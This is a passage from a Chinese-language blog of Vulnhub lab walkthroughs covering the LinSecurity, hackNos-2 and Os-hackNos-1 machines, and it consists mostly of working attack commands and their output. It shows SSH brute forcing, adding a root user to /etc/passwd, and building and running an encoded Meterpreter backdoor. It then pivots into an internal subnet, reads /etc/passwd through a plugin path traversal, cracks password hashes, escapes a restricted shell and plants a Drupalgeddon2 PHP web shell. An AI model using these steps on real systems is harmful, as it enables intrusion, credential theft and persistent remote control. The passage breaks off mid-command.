3,4          111&#x2F;tcp6  rpcbind</span><br><span class="line">|   100000  3,4          111&#x2F;udp6  rpcbind</span><br><span class="line">|   100003  3           2049&#x2F;udp   nfs</span><br><span class="line">|   100003  3           2049&#x2F;udp6  nfs</span><br><span class="line">|   100003  3,4         2049&#x2F;tcp   nfs</span><br><span class="line">|   100003  3,4         2049&#x2F;tcp6  nfs</span><br><span class="line">|   100005  1,2,3      36117&#x2F;tcp   mountd</span><br><span class="line">|   100005  1,2,3      36311&#x2F;udp   mountd</span><br><span class="line">|   100005  1,2,3      50621&#x2F;tcp6  mountd</span><br><span class="line">|   100005  1,2,3      58468&#x2F;udp6  mountd</span><br><span class="line">|   100021  1,3,4      36071&#x2F;udp   nlockmgr</span><br><span class="line">|   100021  1,3,4      38529&#x2F;tcp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      41451&#x2F;udp6  nlockmgr</span><br><span class="line">|   100021  1,3,4      41509&#x2F;tcp   nlockmgr</span><br><span class="line">|   100227  3           2049&#x2F;tcp   nfs_acl</span><br><span class="line">|   100227  3           2049&#x2F;tcp6  nfs_acl</span><br><span class="line">|   100227  3           2049&#x2F;udp   nfs_acl</span><br><span class="line">|_  100227  3           2049&#x2F;udp6  nfs_acl</span><br><span class="line">2049&#x2F;tcp open  nfs_acl 3 (RPC #100227)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">NSE: Script Post-scanning.</span><br><span class="line">Initiating NSE at 04:02</span><br><span class="line">Completed NSE at 04:02, 0.00s elapsed</span><br><span class="line">Initiating NSE at 04:02</span><br><span class="line">Completed NSE at 04:02, 0.00s elapsed</span><br><span class="line">Initiating NSE at 04:02</span><br><span class="line">Completed NSE at 04:02, 0.00s elapsed</span><br><span class="line">Read data files from: &#x2F;usr&#x2F;bin&#x2F;..&#x2F;share&#x2F;nmap</span><br><span class="line">Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.88 seconds</span><br></pre></td></tr></table></figure><p>开放ssh服务与nfs服务</p><h3 id="漏洞利用-2"><a class="markdownIt-Anchor" href="#漏洞利用-2"></a> 漏洞利用</h3><p><strong>NFS目录挂载</strong><br />尝试在A1上挂载A2的<code>/home/peter</code>目录</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">apt-get install nfs-common</span><br><span class="line">vim &#x2F;etc&#x2F;exports</span><br><span class="line">    &#x2F;share1 *(sync,ro) 192.168.56.103(sync,rw)</span><br><span class="line">systemctl restart rpcbind</span><br><span class="line">systemctl restart nfs</span><br><span class="line">showmount -e 192.168.56.103</span><br><span class="line">    Export list for 192.168.56.103:</span><br><span class="line">    &#x2F;home&#x2F;peter *</span><br><span class="line">mkdir &#x2F;mnt&#x2F;share1</span><br><span class="line">mount -t nfs 192.168.56.103:&#x2F;home&#x2F;peter &#x2F;mnt&#x2F;share1</span><br><span class="line">cd &#x2F;mnt&#x2F;share1</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p>挂载失败</p><p><strong>RPCBind</strong><br />未找到可以获取Shell的EXP</p><p><strong>SSH</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proxychains hydra -V -I -f -t 64 -L user -P pass ssh:&#x2F;&#x2F;192.168.56.103:22</span><br><span class="line"></span><br><span class="line">[22][ssh] host: 192.168.56.103   login: bob   password: secret</span><br></pre></td></tr></table></figure><p>获取账户“bob”</p><h3 id="权限提升-2"><a class="markdownIt-Anchor" href="#权限提升-2"></a> 权限提升</h3><p>在A1上用SSH登录A2，sudo提权，写入新root账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ssh bob@192.168.56.103</span><br><span class="line">sudo -i</span><br><span class="line">secret</span><br><span class="line">perl -le &#39;print crypt(&quot;hackforfun&quot;,&quot;addedsalt&quot;)&#39;</span><br><span class="line">    adWo3GnVnKzuU</span><br><span class="line">echo &#39;test:adWo3GnVnKzuU:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt; &#x2F;etc&#x2F;passwd</span><br><span class="line">exit</span><br><span class="line">exit</span><br><span class="line">ssh test@192.168.56.103</span><br><span class="line">hackforfun</span><br><span class="line">uname -a</span><br><span class="line">    Linux linsecurity 4.15.0-70-generic #79-Ubuntu SMP Tue Nov 12 10:36:11 UTC 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux</span><br></pre></td></tr></table></figure><p>构造Meterpreter后门程序</p><p><code>msfvenom -p linux/x64/meterpreter/bind_tcp RHOST=192.168.56.103 LPORT=2345 -e x86/shikata_ga_nai -i 11 -f elf &gt; msf2.elf</code></p><p>将Meterpreter后门程序上传至A2<br /><code>proxychians scp msf2.elf test@192.168.56.103:/root/msf2.elf</code></p><p>在A2上运行后门程序</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod +X msf2.elf</span><br><span class="line">.&#x2F;msf2.elf &amp;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set RHOST 192.168.56.103</span><br><span class="line">set LPORT 2345</span><br><span class="line">run</span><br></pre></td></tr></table></figure><p>成功获取Shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line">Interface  1</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : lo</span><br><span class="line">Hardware MAC : 00:00:00:00:00:00</span><br><span class="line">MTU          : 65536</span><br><span class="line">Flags        : UP,LOOPBACK</span><br><span class="line">IPv4 Address : 127.0.0.1</span><br><span class="line">IPv4 Netmask : 255.0.0.0</span><br><span class="line">IPv6 Address : ::1</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  2</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s3</span><br><span class="line">Hardware MAC : 08:00:27:d8:9f:d6</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.56.103</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:fed8:9fd6</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  3</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : enp0s8</span><br><span class="line">Hardware MAC : 08:00:27:be:f1:93</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 192.168.156.5</span><br><span class="line">IPv4 Netmask : 255.255.255.0</span><br><span class="line">IPv6 Address : fe80::a00:27ff:febe:f193</span><br><span class="line">IPv6 Netmask : ffff:ffff:ffff:ffff::</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interface  4</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">Name         : docker0</span><br><span class="line">Hardware MAC : 02:42:f4:43:ba:1b</span><br><span class="line">MTU          : 1500</span><br><span class="line">Flags        : UP,BROADCAST,MULTICAST</span><br><span class="line">IPv4 Address : 172.17.0.1</span><br><span class="line">IPv4 Netmask : 255.255.0.0</span><br></pre></td></tr></table></figure><p>发现192.168.156.0网段</p><p>在Meterpreter中添加路由</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">run autoroute -s 192.168.156.0&#x2F;24</span><br><span class="line">run autoroute -p</span><br><span class="line"></span><br><span class="line">Active Routing Table</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   Subnet             Netmask            Gateway</span><br><span class="line">   ------             -------            -------</span><br><span class="line">   192.168.56.0       255.255.255.0      Session 1</span><br><span class="line">   192.168.156.0      255.255.255.0      Session 2</span><br></pre></td></tr></table></figure><p>在MSF中扫描内网网段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary&#x2F;scanner&#x2F;discovery&#x2F;arp_sweep </span><br><span class="line">set RHOSTS 192.168.156.0&#x2F;24</span><br><span class="line">set THREADS 20</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">[+] 192.168.156.6 appears to be up (CADMUS COMPUTER SYSTEMS)</span><br></pre></td></tr></table></figure><p>发现内网机器A3</p><hr /><h2 id="hacknos-2"><a class="markdownIt-Anchor" href="#hacknos-2"></a> hackNos-2</h2><h3 id="端口扫描-3"><a class="markdownIt-Anchor" href="#端口扫描-3"></a> 端口扫描</h3><p><code>proxychains nmap -sT -Pn -v -T5 -A 192.168.156.6</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 192.168.156.6</span><br><span class="line">Host is up (0.00095s latency).</span><br><span class="line">Not shown: 998 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 94:36:4e:71:6a:83:e2:c1:1e:a9:52:64:45:f6:29:80 (RSA)</span><br><span class="line">|   256 b4:ce:5a:c3:3f:40:52:a6:ef:dc:d8:29:f3:2c:b5:d1 (ECDSA)</span><br><span class="line">|_  256 09:6c:17:a1:a3:b4:c7:78:b9:ad:ec:de:8f:64:b1:7b (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.29 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: GET POST OPTIONS HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.29 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">MAC Address: 08:00:27:D8:5B:21 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Aggressive OS guesses: Linux 2.6.32 (96%), Linux 3.2 - 4.9 (96%), Netgear ReadyNAS 2100 (RAIDiator 4.2.24) (96%), Linux 2.6.32 - 3.10 (96%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)</span><br></pre></td></tr></table></figure><h3 id="web路径枚举-2"><a class="markdownIt-Anchor" href="#web路径枚举-2"></a> Web路径枚举</h3><p><code>dirb http://192.168.156.6 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.156.6&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.156.6&#x2F;index.html (CODE:200|SIZE:10918)                                                     </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.156.6&#x2F;server-status (CODE:403|SIZE:278)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;                                                                  </span><br><span class="line">                                                                                                            </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; ----</span><br><span class="line">+ http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;index.php (CODE:301|SIZE:0)                                                    </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-admin&#x2F;                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;</span><br></pre></td></tr></table></figure><h3 id="漏洞利用-3"><a class="markdownIt-Anchor" href="#漏洞利用-3"></a> 漏洞利用</h3><p>使用wpscan针对wordpress进行扫描</p><p><code>proxychains wpscan --url http://192.168.156.6/tsweb/ --enumerate u</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] user</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Wp Json Api (Aggressive Detection)</span><br><span class="line"> |   - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure><p>发现存在用户user</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$ wpscan --url http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F; --enumerate p</span><br><span class="line"></span><br><span class="line">[i] Plugin(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] gracemedia-media-player</span><br><span class="line"> | Location: http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;</span><br><span class="line"> | Latest Version: 1.0 (up to date)</span><br><span class="line"> | Last Updated: 2013-07-21T15:09:00.000Z</span><br><span class="line"> |</span><br><span class="line"> | Found By: Urls In Homepage (Passive Detection)</span><br><span class="line"> |</span><br><span class="line"> | Version: 1.0 (100% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br><span class="line"> | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)</span><br><span class="line"> |  - http:&#x2F;&#x2F;192.168.156.6&#x2F;tsweb&#x2F;wp-content&#x2F;plugins&#x2F;gracemedia-media-player&#x2F;readme.txt</span><br></pre></td></tr></table></figure><p>存在插件<code>gracemedia-media-player</code></p><p>搜索得到相关EXP<br /><code>wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&amp;cfg=../../../../../../../../../../etc/passwd</code></p><p>得到两条重要信息</p><ul><li><code>rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash</code></li><li><code>flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash</code></li></ul><p>可以破解flag账户的密码</p><h3 id="权限提升-3"><a class="markdownIt-Anchor" href="#权限提升-3"></a> 权限提升</h3><p>使用john进行字典爆破</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$flag$vqjCxzjtRc7PofLYS2lWf&#x2F;&#39; &gt; passwd</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd</span><br><span class="line">john --show passwd</span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><p>使用flag账户登入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">proxychains ssh flag@192.168.156.6</span><br><span class="line">topsecret</span><br></pre></td></tr></table></figure><p>而登入时使用的是rbash，在进行操作时会很不方便，需要切换到bash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &#39;import os; os.system(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line">perl -e &#39;exec &quot;&#x2F;bin&#x2F;bash&quot;;&#39;</span><br><span class="line">awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;bash&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure><p>以上三条命令均可</p><p>尝试直接sudo提权，失败</p><p>尝试在目标服务器内搜索信息<br />发现文件<code>/var/backups/passbkp/md5-hash</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;var&#x2F;backups&#x2F;passbkp&#x2F;md5-hash</span><br><span class="line">$1$rohit$01Dl0NQKtgfeL08fGrggi0</span><br></pre></td></tr></table></figure><p>得到rohit账户的密码</p><p>使用john破解密码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;$1$rohit$01Dl0NQKtgfeL08fGrggi0&#39; &gt; passwd2</span><br><span class="line">john --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlist&#x2F;rockyou.txt --format&#x3D;md5crypt-long passwd2</span><br><span class="line">john --show passwd2</span><br><span class="line">!%hack41</span><br></pre></td></tr></table></figure><p>切换到rohit账户，并尝试sudo提权</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">su rohit</span><br><span class="line">!%hack41</span><br><span class="line">sudo -i</span><br><span class="line">!%hack41</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br></pre></td></tr></table></figure><hr /><p><strong>内网渗透的几个思路</strong></p><p><em>proxychains+meterpreter</em><br />在获取机器的权限之后，上传meterpreter后门，然后建立路由，再借以本机的socks代理服务来进行流量转发，但是需要注意免杀，以及控制的持续化。meterpreter的便利之处在于，可以建立路由然后便于MSF对于内网的直接渗透，以及附带的许多使用功能。</p><p><em>proxychains+earthworm</em><br />与meterpreter类似，但是只是上传一个流量转发工具而不是后门程序，所以可能不太会需要考虑到免杀这一方面，但是开启代理服务的话貌似还是有点危险的。而且如果进行多层渗透的话，可能需要相应的多搭几条代理路线，在操作时可能需要记下相应的信息。</p><p>nmap进行扫描最好带上<code>-n</code>来取消掉dns解析</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;迟来的文章&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="Vulnhub" scheme="https://yoloyolo.top/tags/Vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>Vulnhub_Walkthrough_Set</title>
    <link href="https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/"/>
    <id>https://yoloyolo.top/2023/02/08/Vulnhub-Walkthrough-Set/</id>
    <published>2023-02-08T13:05:32.000Z</published>
    <updated>2023-03-02T16:44:13.987Z</updated>
    
    <content type="html"><![CDATA[<p>迟来的文章</p><a id="more"></a><h1 id="os-hacknos-1"><a class="markdownIt-Anchor" href="#os-hacknos-1"></a> <a href="https://www.vulnhub.com/entry/hacknos-os-hacknos,401/">Os-hackNos-1</a></h1><p><code>2019/11/30 22:06:46</code></p><h2 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h2><p><code>nmap -sV -Pn -v -T5 -A 192.168.56.104</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22&#x2F;tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 a5:a5:17:70:4d:be:48:ad:ba:64:c1:07:a0:55:03:ea (RSA)</span><br><span class="line">|   256 f2:ce:42:1c:04:b8:99:53:95:42:ab:89:22:66:9e:db (ECDSA)</span><br><span class="line">|_  256 4a:7d:15:65:83:af:82:a3:12:02:21:1c:23:49:fb:e9 (ED25519)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">| http-methods: </span><br><span class="line">|_  Supported Methods: POST OPTIONS GET HEAD</span><br><span class="line">|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (99%), DD-WRT v24-sp2 (Linux 2.4.37) (98%), Linux 3.2 (98%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (96%), Linux 4.4 (96%), Microsoft Windows XP SP3 (96%), BlueArc Titan 2100 NAS device (91%)</span><br></pre></td></tr></table></figure><h2 id="web路径枚举"><a class="markdownIt-Anchor" href="#web路径枚举"></a> Web路径枚举</h2><p><code>dirb http://192.168.56.104 -w</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">---- Scanning URL: http:&#x2F;&#x2F;192.168.56.104&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;                                                               </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;index.html (CODE:200|SIZE:11321)                                                   </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;server-status (CODE:403|SIZE:279)                                                  </span><br><span class="line">                                                                                                           </span><br><span class="line">---- Entering directory: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F; ----</span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;includes&#x2F;                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;index.php (CODE:200|SIZE:7687)                                              </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;misc&#x2F;                                                          </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;modules&#x2F;                                                       </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;profiles&#x2F;                                                      </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;robots.txt (CODE:200|SIZE:2189)                                             </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;scripts&#x2F;                                                       </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;sites&#x2F;                                                         </span><br><span class="line">&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;themes&#x2F;                                                        </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;web.config (CODE:200|SIZE:2200)                                             </span><br><span class="line">+ http:&#x2F;&#x2F;192.168.56.104&#x2F;drupal&#x2F;xmlrpc.php (CODE:200|SIZE:42)</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>Web服务采用了Drupal框架</p><p>搜索得知Drupal框架存在RCE漏洞<br /><code>git clone https://github.com/dreadlocked/Drupalgeddon2.git</code></p><p>尝试对目标使用Exploit<br /><code>ruby drupalgeddon2.rb http://192.168.56.104/drupal/</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Testing: Writing To Web Root   (.&#x2F;)</span><br><span class="line">[i] Payload: echo PD9waHAgaWYoIGlzc2V0KCAkX1JFUVVFU1RbJ2MnXSApICkgeyBzeXN0ZW0oICRfUkVRVUVTVFsnYyddIC4gJyAyPiYxJyApOyB9 | base64 -d | tee shell.php</span><br><span class="line">[+] Result : &lt;?php if( isset( $_REQUEST[&#39;c&#39;] ) ) &#123; system( $_REQUEST[&#39;c&#39;] . &#39; 2&gt;&amp;1&#39; ); &#125;</span><br><span class="line">[+] Very Good News Everyone! Wrote to the web root! Waayheeeey!!!</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">[i] Fake PHP shell:   curl 